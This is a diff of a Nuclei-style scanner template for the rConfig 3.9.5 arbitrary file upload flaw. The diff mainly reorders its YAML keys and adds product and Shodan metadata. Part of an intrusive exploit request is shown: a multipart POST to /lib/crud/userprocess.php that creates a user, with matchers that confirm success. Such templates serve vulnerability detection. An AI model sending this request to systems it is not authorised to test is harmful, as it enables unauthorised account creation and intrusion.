@@ -1,5 +1,4 @@
 id: rconfig-file-upload
-
 info:
   name: rConfig 3.9.5 - Arbitrary File Upload
   author: dwisiswant0
@@ -16,13 +15,23 @@ info:
     cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
     max-request: 1
+    product: rconfig
+    shodan-query: title:"rConfig"
     vendor: rconfig
-  tags: rconfig,rce,edb,file-upload,instrusive,intrusive,vuln
-
+    verified: true
+  tags: edb,file-upload,instrusive,intrusive,rce,rconfig,vuln
 http:
-  - raw:
+  - matchers:
+      - part: body
+        type: word
+        words:
+          - User {{randstr}} successfully added to Database
+      - status:
+          - 302
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /lib/crud/userprocess.php HTTP/1.1
         Host: {{Hostname}}
@@ -59,15 +68,3 @@ http:
 
         9
         --01b28e152ee044338224bf647275f8eb--
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "User {{randstr}} successfully added to Database"
-        part: body
-
-      - type: status
-        status:
-          - 302
-
